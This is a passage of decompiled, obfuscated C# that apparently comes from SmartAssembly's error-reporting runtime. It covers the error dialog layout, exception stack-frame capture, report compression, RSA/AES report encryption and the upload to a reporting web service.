	static void smethod_99(EventHandler eventHandler_0, Class16 class16_0)
	{
		EventHandler eventHandler = class16_0.eventHandler_0;
		EventHandler eventHandler2;
		do
		{
			eventHandler2 = eventHandler;
			EventHandler value = (EventHandler)Delegate.Combine(eventHandler2, eventHandler_0);
			eventHandler = Interlocked.CompareExchange(ref class16_0.eventHandler_0, value, eventHandler2);
		}
		while ((object)eventHandler != eventHandler2);
	}

	static void smethod_100(Enum2 enum2_0, string string_0, Class32 class32_0)
	{
		Class24.smethod_64(class32_0, enum2_0, string_0, string.Empty);
	}

	static bool smethod_101(EventArgs1 eventArgs1_0)
	{
		if (!eventArgs1_0.bool_1)
		{
			return false;
		}
		return eventArgs1_0.class16_0.method_7();
	}

	static void smethod_102(bool bool_0, EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_3 = bool_0;
	}

	static void smethod_103(Class43 class43_0, uint uint_0)
	{
		try
		{
			lock (Class43.object_0)
			{
				Class24.smethod_47(class43_0);
				Class24.smethod_139(uint_0);
			}
		}
		catch
		{
		}
	}

	static bool smethod_104(Class20 class20_0)
	{
		return class20_0.bool_0;
	}

	unsafe static void smethod_105(Class7.Class11 class11_0)
	{
		void* ptr = stackalloc byte[16];
		Array.Copy(class11_0.byte_0, 32768, class11_0.byte_0, 0, 32768);
		class11_0.int_1 -= 32768;
		class11_0.int_4 -= 32768;
		class11_0.int_3 -= 32768;
		*(int*)ptr = 0;
		while (*(int*)ptr < 32768)
		{
			*(int*)((byte*)ptr + 4) = class11_0.short_0[*(int*)ptr] & 0xFFFF;
			class11_0.short_0[*(int*)ptr] = (short)((*(int*)((byte*)ptr + 4) >= 32768) ? (*(int*)((byte*)ptr + 4) - 32768) : 0);
			(*(int*)ptr)++;
		}
		*(int*)((byte*)ptr + 8) = 0;
		while (*(int*)((byte*)ptr + 8) < 32768)
		{
			*(int*)((byte*)ptr + 12) = class11_0.short_1[*(int*)((byte*)ptr + 8)] & 0xFFFF;
			class11_0.short_1[*(int*)((byte*)ptr + 8)] = (short)((*(int*)((byte*)ptr + 12) >= 32768) ? (*(int*)((byte*)ptr + 12) - 32768) : 0);
			(*(int*)((byte*)ptr + 8))++;
		}
	}

	static void smethod_106(int int_0, byte[] byte_0, int int_1, Class7.Class12 class12_0)
	{
		Array.Copy(byte_0, int_1, class12_0.byte_0, class12_0.int_1, int_0);
		class12_0.int_1 += int_0;
	}

	static void smethod_107()
	{
		try
		{
			Class39.smethod_0("Platform OS Bitness: " + (Class24.smethod_15() ? 64 : 32));
		}
		catch
		{
		}
	}

	static string smethod_108(Class32.Class36 class36_0)
	{
		return class36_0.string_2;
	}

	static bool smethod_109(EventArgs1 eventArgs1_0, string string_0)
	{
		if (File.Exists(string_0))
		{
			File.Delete(string_0);
		}
		return Class24.smethod_7(eventArgs1_0.class16_0, string_0);
	}

	static object smethod_110(Class20 class20_0)
	{
		return class20_0.object_0;
	}

	static string smethod_111()
	{
		return "Software\\Wow6432Node\\Red Gate\\" + Class24.smethod_86();
	}

	static void smethod_112(Class7.Stream0 stream0_0, int int_0)
	{
		stream0_0.WriteByte((byte)((uint)int_0 & 0xFFu));
		stream0_0.WriteByte((byte)((uint)(int_0 >> 8) & 0xFFu));
	}

	static Type smethod_113(Class20 class20_0)
	{
		return class20_0.type_0;
	}

	static bool smethod_114(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.bool_2;
	}

	static byte[] smethod_115(byte[] byte_0, string string_0)
	{
		if (string_0.StartsWith("{"))
		{
			Class14.string_0 = "ERR 2006: This template was not properly processed by SmartAssembly";
			return null;
		}
		RijndaelManaged rijndaelManaged = null;
		RSACryptoServiceProvider rSACryptoServiceProvider = null;
		MemoryStream memoryStream = null;
		CryptoStream cryptoStream = null;
		try
		{
			rijndaelManaged = new RijndaelManaged();
			rSACryptoServiceProvider = new RSACryptoServiceProvider();
			rSACryptoServiceProvider.FromXmlString(string_0);
			rijndaelManaged.GenerateKey();
			rijndaelManaged.GenerateIV();
			byte[] array = new byte[48];
			Buffer.BlockCopy(rijndaelManaged.Key, 0, array, 0, 32);
			Buffer.BlockCopy(rijndaelManaged.IV, 0, array, 32, 16);
			memoryStream = new MemoryStream();
			try
			{
				byte[] array2 = rSACryptoServiceProvider.Encrypt(array, fOAEP: false);
				memoryStream.WriteByte(1);
				memoryStream.WriteByte(Convert.ToByte(array2.Length / 8));
				memoryStream.Write(array2, 0, array2.Length);
			}
			catch (CryptographicException)
			{
				try
				{
					byte[] array3 = new byte[16];
					byte[] array4 = new byte[16];
					Buffer.BlockCopy(rijndaelManaged.Key, 0, array3, 0, 16);
					Buffer.BlockCopy(rijndaelManaged.Key, 16, array4, 0, 16);
					byte[] array5 = rSACryptoServiceProvider.Encrypt(array3, fOAEP: false);
					byte[] array6 = rSACryptoServiceProvider.Encrypt(array4, fOAEP: false);
					byte[] array7 = rSACryptoServiceProvider.Encrypt(rijndaelManaged.IV, fOAEP: false);
					memoryStream.WriteByte(2);
					memoryStream.WriteByte(Convert.ToByte(array5.Length / 8));
					memoryStream.Write(array5, 0, array5.Length);
					memoryStream.Write(array6, 0, array6.Length);
					memoryStream.Write(array7, 0, array7.Length);
				}
				catch (CryptographicException)
				{
					Class14.string_0 = "ERR 2005: The 128-bit encryption is not available on this computer. You need to install the High Encryption Pack in order to use the reporting feature.";
					return null;
				}
			}
			cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(byte_0, 0, byte_0.Length);
			cryptoStream.FlushFinalBlock();
			return memoryStream.ToArray();
		}
		catch (Exception ex3)
		{
			Class14.string_0 = "ERR 2004: " + ex3.Message;
			return null;
		}
		finally
		{
			rijndaelManaged?.Clear();
			rSACryptoServiceProvider?.Clear();
			memoryStream?.Close();
			cryptoStream?.Close();
		}
	}

	static void smethod_116(string string_0, string string_1, byte[] byte_0, string string_2, Class27 class27_0, Delegate2 delegate2_0)
	{
		try
		{
			ReportingService reportingService = new ReportingService(class27_0.string_2);
			if (class27_0.iwebProxy_0 != null)
			{
				((HttpWebClientProtocol)reportingService).set_Proxy(class27_0.iwebProxy_0);
			}
			delegate2_0(reportingService.UploadReport2(class27_0.string_1, byte_0, string_0, string_2, string_1));
		}
		catch (Exception ex)
		{
			delegate2_0("ERR 2002: " + ex.Message);
		}
	}

	static bool smethod_117(int int_0, Class7.Class9 class9_0)
	{
		class9_0.short_0[class9_0.int_1] = 0;
		class9_0.byte_1[class9_0.int_1++] = (byte)int_0;
		class9_0.class10_0.short_0[int_0]++;
		return Class24.smethod_77(class9_0);
	}

	static string smethod_118(string string_0)
	{
		byte[] bytes = Class41.encoding_0.GetBytes(string_0);
		string text = Convert.ToBase64String(bytes).Replace('\\', '@');
		if (text.Length > 50)
		{
			byte[] b = Class41.hashAlgorithm_0.ComputeHash(bytes);
			string path = new Guid(b).ToString().Substring(0, 18);
			string text2 = Path.Combine(Class41.string_2, path);
			text = text2 + ".bin";
			string string_ = text2 + ".txt";
			IsolatedStorageFileStream isolatedStorageFileStream = null;
			try
			{
				isolatedStorageFileStream = Class24.smethod_5(FileAccess.Write, string_, FileMode.CreateNew);
				isolatedStorageFileStream.Write(bytes, 0, bytes.Length);
			}
			catch (IOException)
			{
			}
			finally
			{
				isolatedStorageFileStream?.Close();
			}
		}
		else
		{
			text = Path.Combine(Class41.string_2, text + ".bin");
		}
		return text;
	}

	static Icon smethod_119()
	{
		try
		{
			return Class24.smethod_151();
		}
		catch (Exception)
		{
			return Class24.smethod_69("default");
		}
	}

	unsafe static void smethod_120(Exception exception_0, object[] object_0)
	{
		void* ptr = stackalloc byte[16];
		*(int*)ptr = -1;
		*(int*)((byte*)ptr + 4) = -1;
		*(int*)((byte*)ptr + 8) = 0;
		StackTrace stackTrace = new StackTrace(exception_0);
		try
		{
			if (exception_0.StackTrace != null)
			{
				string[] array = exception_0.StackTrace!.Split('\r', '\n');
				string[] array2 = array;
				*(int*)((byte*)ptr + 12) = 0;
				while (*(int*)((byte*)ptr + 12) < array2.Length)
				{
					string text = array2[*(int*)((byte*)ptr + 12)];
					if (text.Length > 0)
					{
						(*(int*)((byte*)ptr + 8))++;
					}
					(*(int*)((byte*)ptr + 12))++;
				}
			}
		}
		catch
		{
			*(int*)((byte*)ptr + 8) = -1;
		}
		try
		{
			if (stackTrace.FrameCount > 0)
			{
				StackFrame frame = stackTrace.GetFrame(stackTrace.FrameCount - 1);
				*(int*)ptr = (frame.GetMethod()!.MetadataToken & 0xFFFFFF) - 1;
				*(int*)((byte*)ptr + 4) = frame.GetILOffset();
			}
		}
		catch
		{
		}
		try
		{
			SmartStackFrame value = new SmartStackFrame(*(int*)ptr, object_0, *(int*)((byte*)ptr + 4), *(int*)((byte*)ptr + 8));
			LinkedList<object> linkedList;
			if (!exception_0.Data.Contains("SmartStackFrames"))
			{
				linkedList = new LinkedList<object>();
				exception_0.Data["SmartStackFrames"] = linkedList;
			}
			else
			{
				linkedList = (LinkedList<object>)exception_0.Data["SmartStackFrames"];
			}
			linkedList.AddLast(value);
		}
		catch
		{
		}
	}

	static void smethod_121(Form0 form0_0)
	{
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		((Control)form0_0.panel_0).SuspendLayout();
		((Control)form0_0.panel_1).SuspendLayout();
		((Control)form0_0).SuspendLayout();
		Class24.smethod_123(Enum1.const_1, form0_0.control1_0);
		Class24.smethod_123(Enum1.const_1, form0_0.control1_1);
		((Control)form0_0.checkBox_0).set_Anchor((AnchorStyles)6);
		((ButtonBase)form0_0.checkBox_0).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.checkBox_0).set_Location(new Point(22, 98));
		((Control)form0_0.checkBox_0).set_Size(new Size(226, 16));
		((Control)form0_0.checkBox_0).set_TabIndex(13);
		((Control)form0_0.checkBox_0).set_Text("Ignore this error and attempt to &continue.");
		form0_0.checkBox_0.add_CheckedChanged((EventHandler)form0_0.method_5);
		((Control)form0_0.label_0).set_Anchor((AnchorStyles)14);
		form0_0.label_0.set_FlatStyle((FlatStyle)3);
		((Control)form0_0.label_0).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)form0_0.label_0).set_Location(new Point(20, 124));
		((Control)form0_0.label_0).set_Size(new Size(381, 16));
		((Control)form0_0.label_0).set_Text(string.Format("Please tell {0} about this problem.", "gMpc7UzuH9"));
		((Control)form0_0.button_0).set_Anchor((AnchorStyles)10);
		((ButtonBase)form0_0.button_0).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.button_0).set_Size(new Size(75, 24));
		((Control)form0_0.button_0).set_Location(new Point(400 - ((Control)form0_0.button_0).get_Width(), 205));
		((Control)form0_0.button_0).set_TabIndex(4);
		((Control)form0_0.button_0).set_Text("&Don't Send");
		((Control)form0_0.button_0).add_Click((EventHandler)form0_0.method_2);
		((Control)form0_0.button_1).set_Anchor((AnchorStyles)10);
		((ButtonBase)form0_0.button_1).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.button_1).set_Size(new Size(105, 24));
		((Control)form0_0.button_1).set_Location(new Point(((Control)form0_0.button_0).get_Left() - ((Control)form0_0.button_1).get_Width() - 6, 205));
		((Control)form0_0.button_1).set_TabIndex(3);
		((Control)form0_0.button_1).set_Text("&Send Error Report");
		((Control)form0_0.button_1).add_Click((EventHandler)form0_0.method_1);
		((Control)form0_0.button_6).set_Anchor((AnchorStyles)10);
		((ButtonBase)form0_0.button_6).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.button_6).set_Size(new Size(64, 24));
		((Control)form0_0.button_6).set_Location(new Point(((Control)form0_0.button_1).get_Left() - ((Control)form0_0.button_6).get_Width() - 6, 205));
		((Control)form0_0.button_6).set_TabIndex(14);
		((Control)form0_0.button_6).set_Text("De&bug");
		((Control)form0_0.button_6).set_Visible(false);
		((Control)form0_0.button_6).add_Click((EventHandler)form0_0.method_12);
		((Control)form0_0.label_1).set_Anchor((AnchorStyles)14);
		form0_0.label_1.set_FlatStyle((FlatStyle)3);
		((Control)form0_0.label_1).set_Location(new Point(20, 140));
		((Control)form0_0.label_1).set_Size(new Size(381, 55));
		((Control)form0_0.label_1).set_Text(string.Format("To help improve the software you use, {0} is interested in learning more about this error. We have created a report about the error for you to send to us.", "gMpc7UzuH9"));
		((Control)form0_0.class23_0).set_Anchor((AnchorStyles)13);
		((Control)form0_0.class23_0).set_Location(new Point(20, 69));
		((Control)form0_0.class23_0).set_Size(new Size(381, 13));
		((Control)form0_0.button_2).set_Anchor((AnchorStyles)10);
		((ButtonBase)form0_0.button_2).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.button_2).set_Size(new Size(80, 24));
		((Control)form0_0.button_2).set_Location(new Point(400 - ((Control)form0_0.button_2).get_Width(), 205));
		((Control)form0_0.button_2).set_TabIndex(7);
		((Control)form0_0.button_2).set_Text("&Cancel");
		((Control)form0_0.button_2).add_Click((EventHandler)form0_0.method_3);
		((Control)form0_0.button_3).set_Anchor((AnchorStyles)10);
		((Control)form0_0.button_3).set_Enabled(false);
		((ButtonBase)form0_0.button_3).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.button_3).set_Size(new Size(105, 24));
		((Control)form0_0.button_3).set_Location(new Point(((Control)form0_0.button_2).get_Left() - ((Control)form0_0.button_3).get_Width() - 6, 205));
		((Control)form0_0.button_3).set_TabIndex(6);
		((Control)form0_0.button_3).set_Text("&OK");
		((Control)form0_0.button_3).add_Click((EventHandler)form0_0.method_4);
		((Control)form0_0.button_4).set_Anchor((AnchorStyles)10);
		((ButtonBase)form0_0.button_4).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.button_4).set_Location(((Control)form0_0.button_3).get_Location());
		((Control)form0_0.button_4).set_Size(((Control)form0_0.button_3).get_Size());
		((Control)form0_0.button_4).set_TabIndex(5);
		((Control)form0_0.button_4).set_Text("&Retry");
		((Control)form0_0.button_4).set_Visible(false);
		((Control)form0_0.button_4).add_Click((EventHandler)form0_0.method_10);
		((Control)form0_0.button_5).set_Anchor((AnchorStyles)10);
		((ButtonBase)form0_0.button_5).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.button_5).set_Location(((Control)form0_0.button_3).get_Location());
		((Control)form0_0.button_5).set_Size(((Control)form0_0.button_3).get_Size());
		((Control)form0_0.button_5).set_TabIndex(5);
		((Control)form0_0.button_5).set_Text("Save Report");
		((Control)form0_0.button_5).set_Visible(false);
		((Control)form0_0.button_5).add_Click((EventHandler)form0_0.method_0);
		((Control)form0_0.control3_0).set_Location(new Point(87, 146));
		((Control)form0_0.control3_0).set_Visible(false);
		((Control)form0_0.control0_0).SetBounds(24, 72, 368, 16);
		((Control)form0_0.control0_1).SetBounds(24, 96, 368, 16);
		((Control)form0_0.control0_2).SetBounds(24, 120, 368, 16);
		((Control)form0_0.control0_3).SetBounds(24, 144, 368, 16);
		((Control)form0_0.control2_0).set_Anchor((AnchorStyles)6);
		((Control)form0_0.control2_0).SetBounds(20, 444, 120, 32);
		((Control)form0_0.panel_0).get_Controls().AddRange((Control[])(object)new Control[8]
		{
			(Control)form0_0.button_6,
			(Control)form0_0.checkBox_0,
			(Control)form0_0.label_0,
			(Control)form0_0.button_0,
			(Control)form0_0.button_1,
			(Control)form0_0.label_1,
			(Control)form0_0.class23_0,
			form0_0.control1_0
		});
		((Control)form0_0.panel_0).set_Size(new Size(413, 240));
		((Control)form0_0.panel_0).set_TabIndex(0);
		((Control)form0_0.panel_1).get_Controls().AddRange((Control[])(object)new Control[10]
		{
			(Control)form0_0.button_2,
			(Control)form0_0.button_3,
			(Control)form0_0.button_4,
			(Control)form0_0.button_5,
			form0_0.control3_0,
			form0_0.control1_1,
			form0_0.control0_0,
			form0_0.control0_1,
			form0_0.control0_2,
			form0_0.control0_3
		});
		((Control)form0_0.panel_1).set_Size(new Size(413, 240));
		((Control)form0_0.panel_1).set_TabIndex(2);
		((Control)form0_0.panel_1).set_Visible(false);
		((Form)form0_0).set_AutoScaleBaseSize(new Size(5, 13));
		((Form)form0_0).set_ClientSize(new Size(434, 488));
		((Form)form0_0).set_ControlBox(false);
		((Control)form0_0).get_Controls().AddRange((Control[])(object)new Control[3]
		{
			form0_0.control2_0,
			(Control)form0_0.panel_0,
			(Control)form0_0.panel_1
		});
		((Form)form0_0).set_FormBorderStyle((FormBorderStyle)1);
		((Form)form0_0).set_ShowInTaskbar(false);
		((Form)form0_0).set_MinimizeBox(false);
		((Form)form0_0).set_MaximizeBox(false);
		((Form)form0_0).set_StartPosition((FormStartPosition)1);
		((Control)form0_0).set_Text("gMpc7UzuH9");
		if (((Control)form0_0).get_Text().Length == 0)
		{
			((Control)form0_0).set_Text("Error Reporting");
		}
		try
		{
			((Form)form0_0).set_TopMost(true);
		}
		catch
		{
		}
		((Control)form0_0.panel_0).ResumeLayout(false);
		((Control)form0_0.panel_1).ResumeLayout(false);
		((Control)form0_0).ResumeLayout(false);
		((Control)form0_0.button_4).BringToFront();
		((Control)form0_0.button_5).BringToFront();
		((Form)form0_0).set_Size(new Size(419, 264));
		((Control)form0_0.panel_1).set_Dock((DockStyle)5);
		((Control)form0_0.panel_0).set_Dock((DockStyle)5);
	}

	static string smethod_122()
	{
		return "Software\\Red Gate\\" + Class24.smethod_86();
	}

	static void smethod_123(Enum1 enum1_0, Control1 control1_0)
	{
		if (control1_0.enum1_0 != enum1_0)
		{
			control1_0.enum1_0 = enum1_0;
			switch (control1_0.enum1_0)
			{
			default:
				control1_0.bitmap_0 = null;
				break;
			case Enum1.const_1:
				control1_0.bitmap_0 = Class24.smethod_12("error16");
				break;
			case Enum1.const_2:
				control1_0.bitmap_0 = Class24.smethod_12("warning16");
				break;
			}
			((Control)control1_0).Refresh();
		}
	}

	static Class40 smethod_124()
	{
		ulong[] ulong_ = Class24.smethod_51(Class41.string_1);
		Dictionary<string, ulong> dictionary = new Dictionary<string, ulong>();
		try
		{
			string[] fileNames = Class41.isolatedStorageFile_0.GetFileNames(Class41.string_2 + "\\*.bin");
			foreach (string text in fileNames)
			{
				string text2 = Path.GetFileNameWithoutExtension(text);
				string string_ = Path.Combine(Class41.string_2, text);
				ulong[] array = Class24.smethod_51(string_);
				string string_2 = Path.Combine(Class41.string_2, text2 + ".txt");
				IsolatedStorageFileStream isolatedStorageFileStream = null;
				try
				{
					isolatedStorageFileStream = Class24.smethod_5(FileAccess.Read, string_2, FileMode.Open);
					byte[] array2 = new byte[isolatedStorageFileStream.Length];
					isolatedStorageFileStream.Read(array2, 0, array2.Length);
					text2 = Class41.encoding_0.GetString(array2);
				}
				catch (FileNotFoundException)
				{
					text2 = Class41.encoding_0.GetString(Convert.FromBase64String(text2.Replace('@', '\\')));
				}
				finally
				{
					isolatedStorageFileStream?.Close();
				}
				dictionary[text2] = array[0];
			}
		}
		catch (DirectoryNotFoundException)
		{
		}
		return new Class40(ulong_, dictionary);
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	static extern IntPtr GetModuleHandle(string string_0);

	unsafe static void smethod_125(Class23 class23_0)
	{
		void* ptr = stackalloc byte[8];
		try
		{
			Graphics val = ((Control)class23_0).CreateGraphics();
			try
			{
				string text = ((Control)class23_0).get_Text();
				Font font = ((Control)class23_0).get_Font();
				*(int*)((byte*)ptr + 4) = ((Control)class23_0).get_Width();
				*(int*)ptr = Class24.smethod_56(font, *(int*)((byte*)ptr + 4), val, text);
				if (*(int*)ptr > 0)
				{
					((Control)class23_0).set_Height(*(int*)ptr);
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
	}

	static Dictionary<string, ulong> smethod_126(Class40 class40_0)
	{
		return class40_0.dictionary_0;
	}

	static void smethod_127(int int_0, byte[] byte_0, bool bool_0, int int_1, Class7.Class9 class9_0)
	{
		Class24.smethod_89(class9_0.class12_0, bool_0 ? 1 : 0, 3);
		Class24.smethod_155(class9_0.class12_0);
		Class24.smethod_35(int_0, class9_0.class12_0);
		Class24.smethod_35(~int_0, class9_0.class12_0);
		Class24.smethod_106(int_0, byte_0, int_1, class9_0.class12_0);
		Class24.smethod_24(class9_0);
	}

	static SecurityException smethod_128(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.securityException_0;
	}

	static void smethod_129(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6)
	{
		Class24.smethod_120(exception_0, new object[7] { object_0, object_1, object_2, object_3, object_4, object_5, object_6 });
	}

	static IDisposable smethod_130()
	{
		return new Class41.Class42(Class41.string_3);
	}

	static void smethod_131(short[] short_0, byte[] byte_0, Class7.Class9.Class10 class10_0)
	{
		class10_0.short_1 = short_0;
		class10_0.byte_0 = byte_0;
	}

	static string smethod_132()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class24.smethod_122());
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Class24.smethod_111());
			}
			if (registryKey == null)
			{
				return null;
			}
			string result = (string)registryKey.GetValue("Path", null);
			registryKey.Close();
			return result;
		}
		catch
		{
			return null;
		}
	}

	static bool smethod_133(EventArgs1 eventArgs1_0)
	{
		return eventArgs1_0.bool_2;
	}

	[DllImport("kernel32.Dll")]
	static extern short GetVersionEx(ref Class28.Struct8 struct8_0);

	unsafe static bool smethod_134()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Invalid comparison between Unknown and I4
		void* ptr = stackalloc byte[2];
		Form2 form = new Form2();
		try
		{
			((Form)form).ShowDialog();
			*(bool*)ptr = (int)((Form)form).get_DialogResult() == 6;
		}
		finally
		{
			((IDisposable)form)?.Dispose();
		}
		((byte*)ptr)[1] = *(byte*)ptr;
		return ((byte*)ptr)[1] != 0;
	}

	static void smethod_135(Exception exception_0, object object_0, object object_1)
	{
		Class24.smethod_120(exception_0, new object[2] { object_0, object_1 });
	}

	static void smethod_136(EventArgs0 eventArgs0_0, Class16 class16_0)
	{
		class16_0.delegate0_0?.Invoke(class16_0, eventArgs0_0);
	}

	[DllImport("kernel32.dll")]
	static extern void GetSystemInfo(ref Class28.Struct9 struct9_0);

	static void smethod_137(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7)
	{
		Class24.smethod_120(exception_0, new object[8] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7 });
	}

	static bool smethod_138()
	{
		try
		{
			return Class24.GetSystemMetrics(89) != 0;
		}
		catch
		{
			return false;
		}
	}

	static void smethod_139(uint uint_0)
	{
		IDisposable disposable = null;
		try
		{
			disposable = Class24.smethod_130();
			Class24.smethod_182((long)(uint_0 * 8), Class41.string_1);
		}
		catch (Exception)
		{
		}
		finally
		{
			disposable?.Dispose();
		}
	}

	static void smethod_140(Exception exception_0, object object_0, object object_1, object object_2, object object_3)
	{
		Class24.smethod_120(exception_0, new object[4] { object_0, object_1, object_2, object_3 });
	}

	static string smethod_141(Class32.Class36 class36_0)
	{
		return class36_0.string_0;
	}

	static bool smethod_142(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.bool_1;
	}

	unsafe static bool smethod_143(string string_0)
	{
		void* ptr = stackalloc byte[2];
		RegistryKey registryKey = null;
		try
		{
			registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\" + string_0);
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Wow6432Node\\Microsoft\\NET Framework Setup\\NDP\\" + string_0);
			}
			*(bool*)ptr = registryKey != null;
		}
		finally
		{
			registryKey?.Close();
		}
		((byte*)ptr)[1] = *(byte*)ptr;
		return ((byte*)ptr)[1] != 0;
	}

	static string smethod_144(Class15.Class19 class19_0)
	{
		return class19_0.string_2;
	}

	static void smethod_145(Exception exception_0)
	{
		Class24.smethod_120(exception_0, new object[0]);
	}

	static void smethod_146(Control3 control3_0, bool bool_0)
	{
		control3_0.timer_0.set_Enabled(bool_0);
		control3_0.int_0 = 0;
		((Control)control3_0).Refresh();
	}

	[DllImport("user32", CharSet = CharSet.Unicode)]
	static extern int DrawText(IntPtr intptr_0, string string_0, int int_0, ref Class28.Struct7 struct7_0, int int_1);

	unsafe static bool smethod_147(Class7.Class11 class11_0, int int_0)
	{
		void* ptr = stackalloc byte[23];
		int num = 128;
		*(int*)ptr = 128;
		short[] short_ = class11_0.short_1;
		int int_ = class11_0.int_4;
		*(int*)((byte*)ptr + 4) = class11_0.int_4 + class11_0.int_2;
		*(int*)((byte*)ptr + 8) = Math.Max(class11_0.int_2, 2);
		*(int*)((byte*)ptr + 12) = Math.Max(class11_0.int_4 - 32506, 0);
		*(int*)((byte*)ptr + 16) = class11_0.int_4 + 258 - 1;
		((byte*)ptr)[20] = class11_0.byte_0[*(int*)((byte*)ptr + 4) - 1];
		((byte*)ptr)[21] = class11_0.byte_0[*(int*)((byte*)ptr + 4)];
		if (*(int*)((byte*)ptr + 8) >= 8)
		{
			num >>= 2;
		}
		if (*(int*)ptr > class11_0.int_5)
		{
			*(int*)ptr = class11_0.int_5;
		}
		do
		{
			if (class11_0.byte_0[int_0 + *(int*)((byte*)ptr + 8)] != ((byte*)ptr)[21] || class11_0.byte_0[int_0 + *(int*)((byte*)ptr + 8) - 1] != ((byte*)ptr)[20] || class11_0.byte_0[int_0] != class11_0.byte_0[int_] || class11_0.byte_0[int_0 + 1] != class11_0.byte_0[int_ + 1])
			{
				continue;
			}
			int num2 = int_0 + 2;
			int_ += 2;
			while (class11_0.byte_0[++int_] == class11_0.byte_0[++num2] && class11_0.byte_0[++int_] == class11_0.byte_0[++num2] && class11_0.byte_0[++int_] == class11_0.byte_0[++num2] && class11_0.byte_0[++int_] == class11_0.byte_0[++num2] && class11_0.byte_0[++int_] == class11_0.byte_0[++num2] && class11_0.byte_0[++int_] == class11_0.byte_0[++num2] && class11_0.byte_0[++int_] == class11_0.byte_0[++num2] && class11_0.byte_0[++int_] == class11_0.byte_0[++num2] && int_ < *(int*)((byte*)ptr + 16))
			{
			}
			if (int_ > *(int*)((byte*)ptr + 4))
			{
				class11_0.int_1 = int_0;
				*(int*)((byte*)ptr + 4) = int_;
				*(int*)((byte*)ptr + 8) = int_ - class11_0.int_4;
				if (*(int*)((byte*)ptr + 8) >= *(int*)ptr)
				{
					break;
				}
				((byte*)ptr)[20] = class11_0.byte_0[*(int*)((byte*)ptr + 4) - 1];
				((byte*)ptr)[21] = class11_0.byte_0[*(int*)((byte*)ptr + 4)];
			}
			int_ = class11_0.int_4;
		}
		while ((int_0 = short_[int_0 & 0x7FFF] & 0xFFFF) > *(int*)((byte*)ptr + 12) && --num != 0);
		class11_0.int_2 = Math.Min(*(int*)((byte*)ptr + 8), class11_0.int_5);
		((byte*)ptr)[22] = ((class11_0.int_2 >= 3) ? ((byte)1) : ((byte)0));
		return ((byte*)ptr)[22] != 0;
	}

	static string smethod_148()
	{
		return "SmartAssembly";
	}

	static Assembly smethod_149()
	{
		try
		{
			return Assembly.GetExecutingAssembly();
		}
		catch
		{
			return null;
		}
	}

	static void smethod_150(EventHandler eventHandler_0, Class25 class25_0)
	{
		EventHandler eventHandler = class25_0.eventHandler_0;
		EventHandler eventHandler2;
		do
		{
			eventHandler2 = eventHandler;
			EventHandler value = (EventHandler)Delegate.Combine(eventHandler2, eventHandler_0);
			eventHandler = Interlocked.CompareExchange(ref class25_0.eventHandler_0, value, eventHandler2);
		}
		while ((object)eventHandler != eventHandler2);
	}

	unsafe static Icon smethod_151()
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 0;
		*(int*)((byte*)ptr + 8) = Class24.ExtractIconEx(Application.get_ExecutablePath(), -1, ref *(int*)((byte*)ptr + 4), ref *(int*)((byte*)ptr + 4), 1);
		if (*(int*)((byte*)ptr + 8) > 0)
		{
			Class24.ExtractIconEx(Application.get_ExecutablePath(), 0, ref *(int*)ptr, ref *(int*)((byte*)ptr + 4), 1);
			if (*(int*)ptr != 0)
			{
				return Icon.FromHandle(new IntPtr(*(int*)ptr));
			}
		}
		return null;
	}

	[DllImport("gdi32.dll")]
	static extern IntPtr SelectObject(IntPtr intptr_0, IntPtr intptr_1);

	static string smethod_152()
	{
		return Class24.smethod_36().string_0;
	}

	unsafe static void smethod_153(bool bool_0, int int_0, Class7.Class9 class9_0, int int_1, byte[] byte_0)
	{
		void* ptr = stackalloc byte[24];
		class9_0.class10_0.short_0[256]++;
		Class24.smethod_156(class9_0.class10_0);
		Class24.smethod_156(class9_0.class10_1);
		Class7.Class9.Class10 class10_ = class9_0.class10_0;
		Class7.Class9.Class10 class10_2 = class9_0.class10_2;
		Class24.smethod_158(class10_2, class10_);
		class10_ = class9_0.class10_1;
		class10_2 = class9_0.class10_2;
		Class24.smethod_158(class10_2, class10_);
		Class24.smethod_156(class9_0.class10_2);
		*(int*)ptr = 4;
		*(int*)((byte*)ptr + 4) = 18;
		while (*(int*)((byte*)ptr + 4) > *(int*)ptr)
		{
			if (class9_0.class10_2.byte_0[Class7.Class9.int_0[*(int*)((byte*)ptr + 4)]] > 0)
			{
				*(int*)ptr = *(int*)((byte*)ptr + 4) + 1;
			}
			(*(int*)((byte*)ptr + 4))--;
		}
		*(int*)((byte*)ptr + 8) = 14 + *(int*)ptr * 3 + Class24.smethod_175(class9_0.class10_2) + Class24.smethod_175(class9_0.class10_0) + Class24.smethod_175(class9_0.class10_1) + class9_0.int_2;
		*(int*)((byte*)ptr + 12) = class9_0.int_2;
		*(int*)((byte*)ptr + 16) = 0;
		while (*(int*)((byte*)ptr + 16) < 286)
		{
